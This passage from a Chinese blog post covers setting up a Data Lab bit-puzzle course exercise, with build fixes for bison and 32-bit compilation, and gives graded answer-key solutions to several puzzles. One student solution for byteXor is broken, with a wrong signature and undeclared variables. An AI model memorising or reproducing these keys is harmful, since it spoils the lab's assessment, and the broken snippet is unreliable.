20.</span></span><br></pre></td></tr></table></figure><p><code>Driverhdrs.pm</code>文件与上面的<code>Driverlib.pm</code>文件同理，再次执行：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-4-8-centos lab1]<span class="comment"># ./src/driver.pl -u "The Prof"</span></span><br><span class="line">./src/driver.pl: ERROR: No executable dlc binary.</span><br></pre></td></tr></table></figure><p>进入<code>src</code>子目录下执行，出现报错：<a href="https://stackoverflow.com/questions/33059187/fatal-error-gnu-stubs-32-h-no-such-file-or-directory-but-stubs-64-h-is-prese" target="_blank" rel="noopener">参考</a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-4-8-centos src]<span class="comment"># ./driver.pl -u "The Prof"</span></span><br><span class="line">fatal error: gnu/stubs-32.h: No such file or directory<span class="string">" but stubs-64.h is present</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum -y install glibc-devel.i686 glibc-devel</span><br></pre></td></tr></table></figure><p>之后就可以成功执行了，但是前端页面仍然不变，需要提交如下指令：（非常坑，还是看文档不仔细，🥦</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-4-8-centos src]<span class="comment"># ./driver.pl -u "Tiger"</span></span><br></pre></td></tr></table></figure><p>在配置文件<code>./contest/Contest.pm</code>中可以查看：</p><figure class="highlight pm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$SERVER_NAME = <span class="string">"10.0.2.15"</span>;  <span class="comment"># 需要修改成自己的服务器</span></span><br><span class="line">$BASE_USERID = <span class="string">"Tiger"</span>;  <span class="comment"># 初始用户名</span></span><br><span class="line">$UPDATE_PERIOD = <span class="number">10</span>;  <span class="comment"># 每10s刷新数据</span></span><br><span class="line">$REQUESTD_PORT = <span class="number">8080</span>;  <span class="comment"># Request server's port</span></span><br><span class="line">$RESULTD_PORT = <span class="number">8081</span>;   <span class="comment"># Result server's port</span></span><br><span class="line"><span class="comment"># ... 还有好多其他配置信息</span></span><br></pre></td></tr></table></figure><p>到此前端可以正常显示了。</p><h2 id="22-出题"><a class="markdownIt-Anchor" href="#22-出题"></a> 2.2 出题</h2><p>具体操作参考<code>./src/dlcdir/README</code></p><ol><li><p><code>./src/puzzles</code>目录下存放试题，新出的题目需要放在此处，由于本次实验出题主要更改原试题的名称，比较简单，魔改即可（包括文件名、函数名、注释等）</p></li><li><p>将新出的题目名称添加到<code>./src/dlcdir/legallist.c</code>中的<code>legallist</code>中，魔改：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">"isZero"</span>&#125;, <span class="number">0</span>, <span class="number">3</span>, &#123;<span class="string">'~'</span>, <span class="string">'&amp;'</span>, <span class="string">'!'</span>, <span class="string">'^'</span>, <span class="string">'|'</span>, <span class="string">'+'</span>, LS, RS, <span class="number">0</span>&#125;&#125;,</span><br></pre></td></tr></table></figure></li><li><p>然后在<code>./src/dlcdir</code>目录下重新编译：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make superclean</span><br><span class="line">make</span><br></pre></td></tr></table></figure></li><li><p>此时如果成功执行，<code>./src/dlcdir</code>目录下会生成<code>dlc</code>可执行文件，并将其复制到上级目录中；</p></li><li><p>在<code>./src/selections.c</code>文件中存有你要选择出题的题目列表，默认13个，根据需求进行修改。</p></li></ol><p><strong>下面是make过程中出现的报错记录：</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-4-8-centos dlcdir]<span class="comment"># make</span></span><br><span class="line">bison -y -dv ANSI-C.y</span><br><span class="line">make: bison: Command not found</span><br><span class="line">make: *** [Makefile:40: y.tab.h] Error 127</span><br></pre></td></tr></table></figure><p>原因是未安装bison，进行安装：<a href="https://blog.csdn.net/weborn/article/details/6794671" target="_blank" rel="noopener">参考</a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y bison</span><br></pre></td></tr></table></figure><p>然后继续报错：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-4-8-centos dlcdir]<span class="comment"># make</span></span><br><span class="line">bison -y -dv ANSI-C.y</span><br><span class="line">ANSI-C.y:653.15-16: error: $$ <span class="keyword">for</span> the midrule at <span class="variable">$4</span> of ‘declaring.list’ has no declared <span class="built_in">type</span></span><br><span class="line">              $$ = AppendDecl(<span class="variable">$1</span>, <span class="variable">$3</span>, Redecl);</span><br><span class="line">               ^^</span><br><span class="line">ANSI-C.y:708.15-16: error: $$ <span class="keyword">for</span> the midrule at <span class="variable">$4</span> of ‘default.declaring.list’ has no declared <span class="built_in">type</span></span><br><span class="line">             &#123; $$ = AppendDecl(<span class="variable">$1</span>, <span class="variable">$3</span>, NoRedecl); &#125;</span><br><span class="line">               ^^</span><br><span class="line">ANSI-C.y:1408.14-15: error: $$ <span class="keyword">for</span> the midrule at <span class="variable">$3</span> of ‘labeled.statement’ has no declared <span class="built_in">type</span></span><br><span class="line">            &#123; $$ = BuildLabel(<span class="variable">$1</span>, NULL); &#125;</span><br><span class="line">              ^^</span><br><span class="line">make: *** [Makefile:40: y.tab.h] Error 1</span><br></pre></td></tr></table></figure><p>原因是bison版本太新，需要更换版本：<a href="https://lists.gnu.org/archive/html/help-bison/2009-03/msg00015.html" target="_blank" rel="noopener">参考</a></p><p>查看版本：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-4-8-centos dlcdir]<span class="comment"># bison -V</span></span><br><span class="line">bison (GNU Bison) 3.0.4</span><br><span class="line">Written by Robert Corbett and Richard Stallman.</span><br><span class="line"></span><br><span class="line">Copyright (C) 2015 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the <span class="built_in">source</span> <span class="keyword">for</span> copying conditions.  There is NO</span><br><span class="line">warranty; not even <span class="keyword">for</span> MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br></pre></td></tr></table></figure><p>删除bison：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum remove bison.x86_64</span><br></pre></td></tr></table></figure><p>下面更换bison版本：<a href="https://www.shuzhiduo.com/A/q4zVVOZWzK/" target="_blank" rel="noopener">参考</a></p><ol><li><p>下载bison的压缩包，版本要<strong>低于1.75</strong>，<a href="http://ftp.gnu.org/gnu/bison/" target="_blank" rel="noopener">链接</a></p></li><li><p>安装：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> bison-x.x</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure></li></ol><hr><p>bison版本正确后，下面继续做make，但是报了一大堆warning，然后报错：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">heap.h:69:21: warning: inline <span class="keyword">function</span> ‘HeapAllocate’ declared but never defined</span><br><span class="line"> GLOBAL inline void *HeapAllocate(int number, int size);</span><br><span class="line">...</span><br><span class="line">/root/Lab/lab1/src/dlcdir/check.c:339: undefined reference to `MakeConstSlong<span class="string">'</span></span><br><span class="line"><span class="string">/root/Lab/lab1/src/dlcdir/check.c:339: undefined reference to `MakeReturnCoord'</span></span><br><span class="line">collect2: error: ld returned 1 <span class="built_in">exit</span> status</span><br><span class="line">make: *** [Makefile:36: dlc] Error 1</span><br></pre></td></tr></table></figure><p>注意：这里搜索最后的报错部分无果，搜索warning部分可以解决。</p><p>这是内联函数<code>inline</code>引发的warning，添加编译选项<code>-fgnu89-inline</code>来修复，修改<code>./src/Makefile</code>，<a href="https://stackoverflow.com/questions/13120633/how-to-deal-with-warning-inline-function-stat64-declared-but-never-defined" target="_blank" rel="noopener">参考</a></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_CFLAGS = -g  -O2 -fgnu89-inline</span><br></pre></td></tr></table></figure><p>下面继续编译，之前需要清理下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make clean</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>现在就可以成功编译了，但是此时是<code>dlc</code>是64位可执行程序，在我们学生默认的32位debian虚拟机是无法运行的：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">liuzhenlong@debian:~/Lab_new/lab1-handout$ ./dlc bits.c</span><br><span class="line">-bash: ./dlc: cannot execute binary file: Exec format error</span><br><span class="line">liuzhenlong@debian:~/Lab_new/lab1-handout$ file dlc</span><br><span class="line">dlc: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=1dcd289bac34aee0dde34abd43a959588d79b382, with debug_info, not stripped</span><br></pre></td></tr></table></figure><p>所以需要修改成32位编译：<a href="https://www.cnblogs.com/xuejianbest/p/10285173.html" target="_blank" rel="noopener">参考</a></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_CFLAGS = -g  -O2 -fgnu89-inline -m32</span><br></pre></td></tr></table></figure><p>下面继续编译，之前需要清理下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">make clean</span><br><span class="line">make </span><br><span class="line">liuzhenlong@debian:~/Lab_new/lab1-handout$ file dlc</span><br><span class="line">dlc: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=ec898c28449afe1d16254e2cbe67617c1874b026, with debug_info, not stripped</span><br></pre></td></tr></table></figure><p>现在<code>dlc</code>可执行程序已经生成。</p><h2 id="23-导出实验"><a class="markdownIt-Anchor" href="#23-导出实验"></a> 2.3 导出实验</h2><p>在项目主目录下执行：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-4-8-centos lab1]<span class="comment"># make all</span></span><br><span class="line">[root@VM-4-8-centos lab1]<span class="comment"># ll</span></span><br><span class="line">total 1232</span><br><span class="line">drwxr-xr-x 2 root root    4096 Apr  9 22:20 contest</span><br><span class="line">drwxr-xr-x 4 root root    4096 Apr  8 10:58 grade</span><br><span class="line">drwxr-xr-x 2 root root    4096 Apr 13 00:13 lab1-handout</span><br><span class="line">-rw-r--r-- 1 root root 1228800 Apr 13 00:13 lab1-handout.tar</span><br><span class="line">-rw-r--r-- 1 root root    2436 Apr  7 23:06 Makefile</span><br><span class="line">-rw-r--r-- 1 root root    8097 Apr  7 23:06 README</span><br><span class="line">drwxr-xr-x 5 root root    4096 Apr 13 00:13 src</span><br><span class="line">drwxr-xr-x 2 root root    4096 Apr  7 23:04 writeup</span><br></pre></td></tr></table></figure><p><code>lab1-handout.tar</code>是生成的实验，将其分发给同学们即可进行实验了。</p><h1 id="3-题解"><a class="markdownIt-Anchor" href="#3-题解"></a> 3 题解</h1><h2 id="31-lsbzeroc"><a class="markdownIt-Anchor" href="#31-lsbzeroc"></a> 3.1 lsbZero.c</h2><p><strong>注释</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *   lsbZero - set 0 to the least significant bit of x</span></span><br><span class="line"><span class="comment"> *   Example: lsbZero(0x87654321) = 0x87654320</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 5</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p><strong>题目</strong>：</p><p>给定一个<code>int</code>型整数<code>x</code>，将其最低一位有效位置0。</p><ul><li>例如：<code>lsbZero(0x87654321) = 0x87654320</code></li></ul><p><strong>实现</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 法1（标准答案-3'）</span></span><br><span class="line"><span class="comment">/* */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lsbZero</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (x | <span class="number">1</span>) + ~<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 法2（目前最佳答案-2'）</span></span><br><span class="line"><span class="comment">/* 右移一位再左移一位实现把最低一位有效位置0 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lsbZero</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x &gt;&gt; <span class="number">1</span> &lt;&lt; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 法3（来自学生-2'）</span></span><br><span class="line"><span class="comment">/* 和 0xfffffffe 相与即可 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lsbZero</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x &amp; (~<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="32-bytenotc"><a class="markdownIt-Anchor" href="#32-bytenotc"></a> 3.2 byteNot.c</h2><p><strong>注释</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *   byteNot.c - bit-inversion to byte n from word x</span></span><br><span class="line"><span class="comment"> *   Bytes numbered from 0 (LSB) to 3 (MSB)</span></span><br><span class="line"><span class="comment"> *   Examples: getByteNot(0x12345678,1) = 0x1234A978</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 6</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p><strong>题目</strong>：</p><p>给定一个<code>int</code>型整数<code>x</code>，将其第<code>n</code>个字节实现取反。</p><ul><li>例如：<code>byteNot(0x12345678,1) = 0x1234A978</code></li></ul><p><strong>实现</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 法1（标准答案-3'）</span></span><br><span class="line"><span class="comment">/* 将0xFF移动到对应字节，然后取按位异或 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">nuaa_question2</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* Shift x n*8 positions right */</span></span><br><span class="line">  <span class="keyword">int</span> shift = n &lt;&lt; <span class="number">3</span>;</span><br><span class="line">  <span class="comment">/* Mask byte */</span></span><br><span class="line">  <span class="keyword">int</span> mask = <span class="number">0xFF</span> &lt;&lt; shift;</span><br><span class="line">  <span class="keyword">return</span> x ^ mask;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="33-bytexorc"><a class="markdownIt-Anchor" href="#33-bytexorc"></a> 3.3 byteXor.c</h2><p><strong>注释</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *   byteXor - compare the nth byte of x and y, if it is same, return 0, if not, return 1</span></span><br><span class="line"><span class="comment"> *   example: byteXor(0x12345678, 0x87654321, 1) = 1</span></span><br><span class="line"><span class="comment"> *            byteXor(0x12345678, 0x87344321, 2) = 0</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 20</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p><strong>题目</strong>：</p><p>给定三个<code>int</code>整数 <code>x</code> 、 <code>y</code>和 <code>n</code> ，比较 <code>x</code> 和 <code>y</code> 的第 <code>n</code> 字节，如果相同则返回 <code>0</code> ，不同则返回 <code>1</code>。</p><ul><li>例如：<code>byteXor(0x12345678, 0x87654321, 1) = 1</code></li><li>例如：<code>byteXor(0x12345678, 0x87344321, 2) = 0</code></li></ul><p><strong>实现</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 法1（标准答案-9'）</span></span><br><span class="line"><span class="comment">/* 移位取指定字节，异或，两次取逻辑非 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">byteXor</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> shift = n &lt;&lt; <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">int</span> xs = x &gt;&gt; shift;</span><br><span class="line">  <span class="keyword">int</span> ys = y &gt;&gt; shift;</span><br><span class="line">  <span class="keyword">int</span> cmp = (xs &amp; <span class="number">0xFF</span>) ^ (ys &amp; <span class="number">0xFF</span>);</span><br><span class="line">  <span class="keyword">return</span> !!cmp &amp; <span class="number">1</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 法2（目前最佳答案-8'）</span></span><br><span class="line"><span class="comment">/* 法1最后的&amp;1是多余的操作 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">byteXor</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> shift = n &lt;&lt; <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">int</span> xs = x &gt;&gt; shift;</span><br><span class="line">  <span class="keyword">int</span> ys = y &gt;&gt; shift;</span><br><span class="line">  <span class="keyword">int</span> cmp = (xs &amp; <span class="number">0xFF</span>) ^ (ys &amp; <span class="number">0xFF</span>);</span><br><span class="line">  <span class="keyword">return</span> !!cmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 法3（来自学生-6'）</span></span><br><span class="line"><span class="comment">/* 把⽬标位移到最低位然后⽤异或⽐较⼀下是否相等即可 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lsbZero</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    _ = n &lt;&lt; <span class="number">3</span>;</span><br><span class="line">  __ = ((x ^ y) &gt;&gt; _) &amp; <span class="number">0xff</span>;</span><br><span class="line">  <span class="keyword">return</span> !!(__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="34-logicaland"><a class="markdownIt-Anchor" href="#34-logicaland"></a> 3.4 logicalAnd</h2><p><strong>注释</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *   logicalAnd - x &amp;&amp; y</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 20</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p><strong>题目</strong>：</p><p>实现逻辑与<code>&amp;&amp;</code>，当两个操作数都是ture的时候，才返回true，否则返回false。</p><ul><li>例如：<code>logicalAnd(1, 0) = 0</code></li><li>例如：<code>logicalAnd(2, 3) = 1</code></li></ul><p><strong>实现</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 法1（标准答案-8'）</span></span><br><span class="line"><span class="comment">/* */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalAnd</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> z = ~!x &amp; ~!y;</span><br><span class="line">  <span class="keyword">return</span> ~(z + <span class="number">1</span>) &amp; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 法2（其他思路-5'）</span></span><br><span class="line"><span class="comment">/* 把x和y分别转换为逻辑的0和1，再相与 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalAnd</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> (!(!x))&amp;(!(!y));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 法3（目前最佳答案-4'）</span></span><br><span class="line"><span class="comment">/* 把x和y分别取NOT，二者相或后再取NOT，即可得到逻辑与 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalAnd</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> !((!x)|(!y));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="35-logicalor"><a class="markdownIt-Anchor" href="#35-logicalor"></a> 3.5 logicalOr</h2><p><strong>注释</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *   logicalOr - x || y</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 20</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p><strong>题目</strong>：</p><p>实现逻辑或<code>||</code>，当两个操作数有一个为ture的时候，就返回true。</p><ul><li>例如：<code>logicalOr(0, 0) = 0</code></li><li>例如：<code>logicalOr(2, 0) = 1</code></li></ul><p><strong>实现</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 法1（标准答案）</span></span><br><span class="line"><span class="comment">/* */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalOr</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ~(!x &amp; !y) &amp; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 法2（目前最佳答案）</span></span><br><span class="line"><span class="comment">/* 把x和y分别转换为逻辑的0和1，再相或 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalOr</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (!(!x))|(!(!y));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="36-rotateleft"><a class="markdownIt-Anchor" href="#36-rotateleft"></a> 3.6 rotateLeft</h2><p><strong>注释</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *   rotateLeft - Rotate x to the left by n</span></span><br><span class="line"><span class="comment"> *   Can assume that 0 &lt;= n &lt;= 31</span></span><br><span class="line"><span class="comment"> *   Examples: rotateLeft(0x87654321,4) = 0x76543218</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt; !</span></span><br><span class="line"><span class="comment"> *   Max ops: 25</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p><strong>题目</strong>：</p><p>给定一个<code>int</code>型整数<code>x</code>，实现循环左移，也就是把<code>x</code>的前<code>n</code>位移到末尾。</p><ul><li>例如：<code>rotateLeft(0x87654321,4) = 0x76543218</code></li></ul><p><strong>实现</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 法1（标准答案-16'）</span></span><br><span class="line"><span class="comment">/* */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rotateLeft</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> n)</span> 